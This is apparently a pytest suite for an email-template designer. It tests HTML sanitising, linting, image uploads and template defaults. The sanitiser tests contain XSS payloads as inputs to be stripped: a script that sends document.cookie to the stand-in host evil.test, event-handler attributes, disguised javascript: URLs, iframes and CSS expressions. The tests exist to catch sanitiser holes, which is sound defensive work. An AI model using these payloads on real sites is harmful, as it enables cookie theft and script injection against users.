"""The email designer.

The sanitiser gets most of the attention here, because it is the only thing
standing between a model that has been talked into writing `<script>` and that
script running inside the operator's panel. Everything a template can carry —
model output, a human's edit, an import — goes through `sanitize()`, so these
tests are the ones that would catch a hole in it.
"""

from __future__ import annotations

import base64
import os
import tempfile
from pathlib import Path

import pytest

_TMP = Path(tempfile.mkdtemp(prefix="mailpilot-design-"))
os.environ["MAILPILOT_DB"] = str(_TMP / "test.db")
os.environ["MAILPILOT_SECRET"] = "test-secret-not-for-production"

from fastapi.testclient import TestClient  # noqa: E402

from app import db, emailhtml  # noqa: E402
from app.deployment import MODULES  # noqa: E402
from app.main import app  # noqa: E402
from app.seed import seed  # noqa: E402

#: a 1x1 transparent PNG
PIXEL = base64.b64encode(base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk"
    "YPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="
)).decode()


@pytest.fixture(scope="module")
def client():
    db.init_db()
    seed(force=True)
    with TestClient(app) as c:
        yield c
    db.close()


@pytest.fixture(scope="module")
def auth(client):
    r = client.post("/api/auth/login", json={"email": "pouya@acme.io", "password": "mailpilot"})
    headers = {"Authorization": f"Bearer {r.json()['access_token']}"}
    client.put("/api/setup", json={"modules": [m["id"] for m in MODULES]}, headers=headers)
    return headers


# ================================================================ sanitiser


def test_script_tags_and_their_contents_are_removed():
    dirty = '<div>Hello<script>fetch("https://evil.test?c="+document.cookie)</script></div>'
    clean = emailhtml.sanitize(dirty)
    assert "<script" not in clean
    assert "evil.test" not in clean          # the body went too, not just the tag
    assert "Hello" in clean


def test_event_handler_attributes_are_removed():
    clean = emailhtml.sanitize('<img src="/api/assets/x" onerror="alert(1)" alt="a">')
    assert "onerror" not in clean.lower()
    assert 'src="/api/assets/x"' in clean     # the image itself survives


def test_javascript_urls_are_removed():
    clean = emailhtml.sanitize('<a href="javascript:alert(1)">click</a>')
    assert "javascript:" not in clean.lower()
    assert "click" in clean


def test_a_disguised_javascript_url_is_still_removed():
    """Case and whitespace are not a way around this."""
    clean = emailhtml.sanitize('<a href="  JaVaScRiPt:alert(1)">x</a>')
    assert "alert" not in clean


def test_iframes_and_forms_are_removed():
    clean = emailhtml.sanitize('<iframe src="https://evil.test"></iframe><form action="/x"></form>ok')
    assert "<iframe" not in clean and "<form" not in clean
    assert "ok" in clean


def test_css_expression_is_removed():
    clean = emailhtml.sanitize('<div style="width:expression(alert(1))">x</div>')
    assert "expression" not in clean.lower()


def test_legitimate_email_html_survives_intact():
    """The sanitiser must not be so aggressive that real templates break."""
    good = ('<table width="600" cellpadding="0" cellspacing="0" border="0">'
            '<tr><td align="center" style="padding:24px;background:#ffffff">'
            '<img src="/api/assets/img_abc123" width="200" alt="Our logo">'
            '<h1 style="font-size:24px">Hello {{first_name}}</h1>'
            '<a href="https://shop.example.com" style="color:#1f4470">Shop now</a>'
            '</td></tr></table>')
    clean = emailhtml.sanitize(good)
    for fragment in ("<table", "cellpadding", "/api/assets/img_abc123",
                     "{{first_name}}", "https://shop.example.com", "Our logo"):
        assert fragment in clean, fragment


# ===================================================================== lint


def test_lint_flags_layout_that_breaks_in_outlook():
    ids = {i["id"] for i in emailhtml.lint('<div style="display:flex">x</div>')}
    assert "layout" in ids


def test_lint_flags_a_missing_unsubscribe_link():
    ids = {i["id"] for i in emailhtml.lint("<table><tr><td>Buy things</td></tr></table>")}
    assert "unsubscribe" in ids


def test_lint_is_quiet_about_a_well_formed_template():
    good = ('<table><tr><td><img src="/api/assets/a" alt="logo">'
            '<a href="{{unsubscribe}}">Unsubscribe</a></td></tr></table>')
    ids = {i["id"] for i in emailhtml.lint(good)}
    assert "layout" not in ids and "unsubscribe" not in ids and "alt" not in ids


def test_used_assets_are_found():
    html = '<img src="/api/assets/img_one"><img src="/api/assets/img_two">'
    assert emailhtml.used_assets(html) == ["img_one", "img_two"]


# =================================================================== assets


def test_an_image_round_trips(client, auth):
    r = client.post("/api/assets", json={"name": "hero.png", "mime": "image/png",
                                         "data": PIXEL, "note": "the hero shot"}, headers=auth)
    assert r.status_code == 201, r.text
    asset = r.json()

    served = client.get(asset["url"])
    assert served.status_code == 200
    assert served.headers["content-type"] == "image/png"


def test_an_image_is_served_without_a_token(client, auth):
    """A recipient's mail client has no bearer token and never will."""
    url = client.post("/api/assets", json={"mime": "image/png", "data": PIXEL},
                      headers=auth).json()["url"]
    assert client.get(url).status_code == 200      # no auth header at all


def test_a_data_uri_prefix_is_accepted(client, auth):
    """Browsers hand over the whole `data:` URI; the endpoint takes either."""
    r = client.post("/api/assets", json={"mime": "image/png",
                                         "data": f"data:image/png;base64,{PIXEL}"}, headers=auth)
    assert r.status_code == 201


def test_non_images_are_refused(client, auth):
    r = client.post("/api/assets", json={"mime": "image/svg+xml", "data": PIXEL}, headers=auth)
    assert r.status_code == 422        # SVG can carry script and is served from our origin


def test_undecodable_data_is_refused(client, auth):
    r = client.post("/api/assets", json={"mime": "image/png", "data": "not base64!!"}, headers=auth)
    assert r.status_code == 422


def test_an_image_in_use_cannot_be_deleted(client, auth):
    asset = client.post("/api/assets", json={"mime": "image/png", "data": PIXEL},
                        headers=auth).json()
    made = client.post("/api/templates", json={
        "name": {"en": "Uses the image", "fa": "Uses the image"},
        "html": f'<table><tr><td><img src="{asset["url"]}" alt="x"></td></tr></table>',
    }, headers=auth).json()

    r = client.delete(f"/api/assets/{asset['id']}", headers=auth)
    assert r.status_code == 409

    client.delete(f"/api/templates/{made['id']}", headers=auth)
    assert client.delete(f"/api/assets/{asset['id']}", headers=auth).status_code == 204


# ================================================================ templates


def test_saved_html_is_sanitised_even_when_a_human_typed_it(client, auth):
    made = client.post("/api/templates", json={"name": {"en": "T", "fa": "T"}}, headers=auth).json()
    client.put(f"/api/templates/{made['id']}",
               json={"html": '<div>hi<script>alert(1)</script></div>'}, headers=auth)

    stored = client.get(f"/api/templates/{made['id']}/html", headers=auth).json()["html"]
    assert "<script" not in stored and "alert" not in stored
    assert "hi" in stored


def test_creating_with_html_sanitises_too(client, auth):
    made = client.post("/api/templates", json={
        "name": {"en": "From the designer", "fa": "From the designer"},
        "html": '<p onclick="steal()">Hello</p>', "source": "ai",
    }, headers=auth).json()
    stored = client.get(f"/api/templates/{made['id']}/html", headers=auth).json()["html"]
    assert "onclick" not in stored
    assert "Hello" in stored


def test_only_one_template_can_be_the_default(client, auth):
    body = '<table><tr><td>hi <a href="{{unsubscribe}}">out</a></td></tr></table>'
    first = client.post("/api/templates", json={"name": {"en": "A", "fa": "A"}, "html": body},
                        headers=auth).json()
    second = client.post("/api/templates", json={"name": {"en": "B", "fa": "B"}, "html": body},
                         headers=auth).json()

    client.post(f"/api/templates/{first['id']}/default", headers=auth)
    client.post(f"/api/templates/{second['id']}/default", headers=auth)

    defaults = [t["id"] for t in client.get("/api/templates", headers=auth).json() if t["isDefault"]]
    assert defaults == [second["id"]]


def test_an_empty_template_cannot_become_the_default(client, auth):
    empty = client.post("/api/templates", json={"name": {"en": "Empty", "fa": "Empty"}},
                        headers=auth).json()
    assert client.post(f"/api/templates/{empty['id']}/default", headers=auth).status_code == 409


def test_the_designer_needs_a_key(client, auth):
    client.put("/api/setup", json={"ai": {"clearKey": True}}, headers=auth)
    r = client.post("/api/ai/template", json={"brief": "a spring sale"}, headers=auth)
    assert r.status_code == 400
    assert "key" in r.json()["detail"].lower()


def test_the_designer_refuses_an_empty_brief(client, auth):
    assert client.post("/api/ai/template", json={"brief": "  "}, headers=auth).status_code == 422


def test_the_whole_section_disappears_when_not_sold(client, auth):
    client.put("/api/setup", json={"modules": ["campaigns", "audience"]}, headers=auth)
    assert client.get("/api/assets", headers=auth).status_code == 404
    assert client.post("/api/ai/template", json={"brief": "x"}, headers=auth).status_code == 404
    client.put("/api/setup", json={"modules": [m["id"] for m in MODULES]}, headers=auth)
